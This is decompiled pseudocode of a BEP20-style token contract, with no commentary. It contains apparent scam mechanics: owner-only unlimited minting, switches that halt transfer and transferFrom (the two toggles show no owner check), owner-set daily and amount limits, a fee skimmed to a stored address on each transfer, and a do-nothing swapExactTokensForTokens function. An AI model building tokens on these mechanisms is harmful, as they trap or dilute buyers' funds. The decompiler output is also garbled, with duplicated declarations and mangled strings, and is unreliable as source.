contract main {




// =====================  Runtime code  =====================


address owner;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 totalSupply;
uint8 decimals;
uint256 F;
uint256 stor7;
array of uint256 symbol;
array of uint256 name;
uint8 stor10;
uint8 stor10; offset 8
uint8 stor10; offset 16
address stor11;
uint256 sub_189e5cc2;
uint256 sub_4538aa6c;
uint256 stor15;
uint256 sub_0ac96ee4;

function name() payable {
    return name[0 len name.length]
}

function sub_0ac96ee4(?) payable {
    return sub_0ac96ee4
}

function getF() payable {
    if owner != msg.sender:
        revert with 0, 'sOwnable: caller is not the owne'
    return F
}

function totalSupply() payable {
    return totalSupply
}

function sub_189e5cc2(?) payable {
    return sub_189e5cc2
}

function decimals() payable {
    return decimals
}

function sub_4538aa6c(?) payable {
    return sub_4538aa6c
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function getOwner() payable {
    return owner
}

function owner() payable {
    return owner
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function sub_0aede85b(?) payable {
    if not uint8(stor10.field_0):
        uint8(stor10.field_0) = 1
    else:
        uint8(stor10.field_0) = 0
}

function sub_874faf7f(?) payable {
    if not uint8(stor10.field_8):
        uint8(stor10.field_8) = 1
    else:
        uint8(stor10.field_8) = 0
}

function renounceOwnership() payable {
    if owner != msg.sender:
        revert with 0, 'sOwnable: caller is not the owne'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function sub_1c9fe2a4(?) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'sOwnable: caller is not the owne'
    sub_189e5cc2 = arg1
}

function sub_91c678b1(?) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'sOwnable: caller is not the owne'
    sub_4538aa6c = arg1
}

function sub_066c68fd(?) payable {
    if owner != msg.sender:
        revert with 0, 'sOwnable: caller is not the owne'
    if not uint8(stor10.field_16):
        uint8(stor10.field_16) = 1
    else:
        uint8(stor10.field_16) = 0
}

function setFee(uint256 arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'sOwnable: caller is not the owne'
    require arg1 < 20
    require arg2 < 50
    stor7 = arg1
    F = uint8(10 * decimals) * arg2
}

function mint(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'sOwnable: caller is not the owne'
    if not msg.sender:
        revert with 0, 'BEP20: mint to the zero address'
    totalSupply += arg1
    balanceOf[address(msg.sender)] += arg1
    emit 0x72ddf252: arg1, 0, msg.sender
    return 1
}

function swapExactTokensForTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) payable {
    require calldata.size - 4 >= 160
    require arg3 <= 4294967296
    require arg3 + 36 <= calldata.size
    require arg3.length <= 4294967296 and arg3 + (32 * arg3.length) + 36 <= calldata.size
    mem[160 len 1024] = 32, mem[160 len 992]
    return 32, 32, mem[160 len 1024]
}

function transferOwnership(address arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'sOwnable: caller is not the owne'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    38,
                    0x734f776e61626c653a206e6577206f776e657220697320746865207a65726f20616464726573,
                    mem[202 len 26]
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7342455032303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7342455032303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7342455032303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7342455032303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7342455032303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7342455032303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require not uint8(stor10.field_0)
    if uint8(stor10.field_16):
        if block.timestamp - stor15 <= 24 * 3600:
            if sub_0ac96ee4 >= sub_189e5cc2:
                revert with 0, 'Daily limit reached.'
        if sub_0ac96ee4 == sub_189e5cc2:
            sub_0ac96ee4 = 0
    if arg2 > sub_4538aa6c:
        revert with 0, 'Amount limit exceeded'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0xfe42455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xef42455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    require uint8(100 * decimals)
    if arg2 * stor7 / uint8(100 * decimals) <= F:
        balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * stor7 / uint8(100 * decimals))
        balanceOf[arg1] = arg2 - (arg2 * stor7 / uint8(100 * decimals)) + balanceOf[arg1]
        balanceOf[stor11] += arg2 * stor7 / uint8(100 * decimals)
        stor15 = block.timestamp
        sub_0ac96ee4++
        emit 0x72ddf252: (arg2 * stor7 / uint8(100 * decimals)), msg.sender, stor11
        emit 0x72ddf252: (arg2 - (arg2 * stor7 / uint8(100 * decimals))), msg.sender, arg1
    else:
        balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + F
        balanceOf[arg1] = arg2 - F + balanceOf[arg1]
        balanceOf[stor11] += F
        stor15 = block.timestamp
        sub_0ac96ee4++
        emit 0x72ddf252: F, msg.sender, stor11
        emit 0x72ddf252: (arg2 - F), msg.sender, arg1
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require not uint8(stor10.field_8)
    if uint8(stor10.field_16):
        if block.timestamp - stor15 <= 24 * 3600:
            if sub_0ac96ee4 >= sub_189e5cc2:
                revert with 0, 'Daily limit reached.'
        if sub_0ac96ee4 == sub_189e5cc2:
            sub_0ac96ee4 = 0
    if arg3 > sub_4538aa6c:
        revert with 0, 'Amount limit exceeded'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0xfe42455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xef42455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    require uint8(100 * decimals)
    if arg3 * stor7 / uint8(100 * decimals) <= F:
        balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * stor7 / uint8(100 * decimals))
        balanceOf[arg2] = arg3 - (arg3 * stor7 / uint8(100 * decimals)) + balanceOf[arg2]
        balanceOf[stor11] += arg3 * stor7 / uint8(100 * decimals)
        stor15 = block.timestamp
        sub_0ac96ee4++
        emit 0x72ddf252: (arg3 * stor7 / uint8(100 * decimals)), arg1, stor11
        emit 0x72ddf252: (arg3 - (arg3 * stor7 / uint8(100 * decimals))), arg1, arg2
    else:
        balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + F
        balanceOf[arg2] = arg3 - F + balanceOf[arg2]
        balanceOf[stor11] += F
        stor15 = block.timestamp
        sub_0ac96ee4++
        emit 0x72ddf252: F, arg1, stor11
        emit 0x72ddf252: (arg3 - F), arg1, arg2
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7342455032303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7342455032303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}



}
